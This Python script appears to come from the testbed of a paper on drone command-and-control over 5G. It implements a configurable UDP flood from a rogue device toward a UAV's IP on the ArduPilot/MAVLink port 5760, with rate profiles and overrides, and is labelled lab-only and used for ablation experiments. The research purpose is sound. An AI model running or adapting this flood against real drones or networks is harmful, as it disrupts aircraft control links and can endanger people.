#!/usr/bin/env python3
##################################################################################################################################
# Module: udp_flood.py (steady UDP flood — legacy path-endpoint ablation)                                                        #
# Part of the paper: FlyBlind: Silent State Staleness in UAS Command and Control over 5G                                         #
#                                                                                                                                #
# Author: (anonymous; double-blind submission).                                                                                  #
# Institution: withheld (double-blind review).                                                                                   #
# Date: 2026-11                                                                                                                  #
# License: MIT License                                                                                                           #
#                                                                                                                                #
# Description: Rogue UE to peer PDU; post-L3 should not reach victim. Profiles gentle|moderate|aggressive.                       #
##################################################################################################################################

"""Steady UDP flood from rogue UE toward a peer PDU (legacy path-endpoint ablation).

Threat model note
-----------------
Post-L3 separation this attack *should* fail to reach the victim socket — it is
kept for ablation / pre-L3 experiments only. Pure PRB contention uses ext-DN
sinks instead (``co_tenant_load.py``, ``c2_sync_flood.py`` with ``--target EXT``).

Default port 5760 matches ArduPilot SITL. Garbage UDP perturbs the UAV network
stack and contends on the shared bearer even when TCP MAVLink ignores the payload.

Profiles: gentle | moderate | aggressive; override with ``--pps`` / ``--size``.

Usage (ROGUE pod)::
  python3 udp_flood.py moderate --target <UAV_PDU_IP> --bind <ROGUE_PDU_IP> --duration 190
"""
from __future__ import annotations

import argparse
import os
import signal
import socket
import time

SITL_PORT = 5760
PROGRESS_INTERVAL_S = 5.0
SNDBUF_BYTES = 4 * 1024 * 1024

PROFILES: dict[str, dict[str, int]] = {
    "gentle": {"pps": 25, "size": 32},
    "moderate": {"pps": 100, "size": 32},
    "aggressive": {"pps": 200, "size": 64},
}


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="UDP flood for FlyBlind UE-to-UE C2 stress (lab only).")
    p.add_argument("profile", nargs="?", default="moderate", choices=list(PROFILES.keys()))
    p.add_argument("--target", required=True, help="Destination IPv4 (UAV PDU).")
    p.add_argument("--port", type=int, default=SITL_PORT, help=f"Target UDP port (default: {SITL_PORT})")
    p.add_argument("--bind", default=None, help="Source IPv4 to bind (rogue PDU for 5G egress).")
    p.add_argument("--duration", type=float, default=60.0, help="Duration in seconds.")
    p.add_argument("--size", type=int, default=None, help="Payload bytes (overrides profile).")
    p.add_argument("--pps", type=int, default=None, help="Packets/sec (overrides profile).")
    return p.parse_args()


def main() -> int:
    args = parse_args()
    prof = PROFILES[args.profile]
    pps = args.pps if args.pps is not None else prof["pps"]
    size = args.size if args.size is not None else prof["size"]
    if pps <= 0:
        print("[FLOOD] ERROR: --pps must be > 0", flush=True)
        return 1

    payload = os.urandom(size)
    dst = (args.target, args.port)
    interval = 1.0 / pps

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    if args.bind:
        sock.bind((args.bind, 0))
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SNDBUF_BYTES)
    except OSError:
        pass

    running = True

    def stop(_sig, _frame):
        nonlocal running
        running = False

    signal.signal(signal.SIGINT, stop)
    signal.signal(signal.SIGTERM, stop)

    bw_kbps = (pps * size * 8) / 1000.0
    bw_label = f"{bw_kbps:.0f} kbps" if bw_kbps < 1000 else f"{bw_kbps / 1000:.1f} Mbps"
    print(
        f"[FLOOD] profile={args.profile}  bind={args.bind or 'any'}  "
        f"target={args.target}:{args.port}  size={size}B  pps={pps}  ~{bw_label}  "
        f"duration={args.duration}s",
        flush=True,
    )

    start = time.time()
    deadline = start + args.duration
    sent = errors = 0
    last_report = start

    try:
        while running and time.time() < deadline:
            try:
                sock.sendto(payload, dst)
                sent += 1
            except OSError:
                errors += 1

            now = time.time()
            if now - last_report >= PROGRESS_INTERVAL_S:
                elapsed = now - start
                pps_actual = sent / max(elapsed, 0.001)
                mbps = (sent * size * 8) / max(elapsed, 0.001) / 1e6
                print(
                    f"[FLOOD] {elapsed:.0f}s  sent={sent}  ~{pps_actual:.0f} pps  "
                    f"~{mbps:.2f} Mbps  errors={errors}",
                    flush=True,
                )
                last_report = now
            time.sleep(interval)
    except KeyboardInterrupt:
        pass
    finally:
        sock.close()

    elapsed = time.time() - start
    pps_actual = sent / max(elapsed, 0.001)
    mbps = (sent * size * 8) / max(elapsed, 0.001) / 1e6
    print(
        f"[FLOOD] finished after {elapsed:.1f}s  packets={sent}  "
        f"avg={pps_actual:.0f} pps ({mbps:.2f} Mbps)  errors={errors}",
        flush=True,
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
